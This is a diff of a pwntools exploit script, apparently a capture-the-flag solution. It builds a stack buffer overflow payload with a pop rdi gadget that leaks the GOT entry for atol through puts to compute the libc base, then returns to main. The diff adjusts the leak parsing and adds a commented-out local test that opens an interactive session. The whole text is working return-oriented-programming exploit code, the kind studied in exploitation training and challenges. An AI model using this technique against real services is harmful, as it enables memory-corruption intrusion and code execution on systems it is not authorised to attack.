@@ -62,12 +62,13 @@ find_buffer_size()
 find_pop_rdi_gadget()
 main = 0x4007ae
 
+
 p.recvuntil('------- PROCESS -------')
 
 p.recvuntil('exploit key : ')
 p.sendline(str(key))
 
-payload = 'a' * (buffer_size + 8)
+payload = 'a' * (buffer_size +8)
 payload += p64(gadget)
 payload += p64(r.got['atol'])
 payload += p64(r.plt['puts'])
@@ -76,7 +77,13 @@ payload += p64(main)
 p.recvuntil('exploit : ')
 p.sendline(payload)
 
-libc = u64(p.recv(6).ljust(8,'\x00')) - l.sym['atol']
+'''
+t = process('./trust_binary')
+t.sendlineafter('exploit key : ', str(key))
+t.sendlineafter('exploit : ', payload)
+t.interactive()
+'''
+libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - l.sym['atol']
 log.info('libc : ' + hex(libc))
 
 p.recvuntil('exploit key : ')
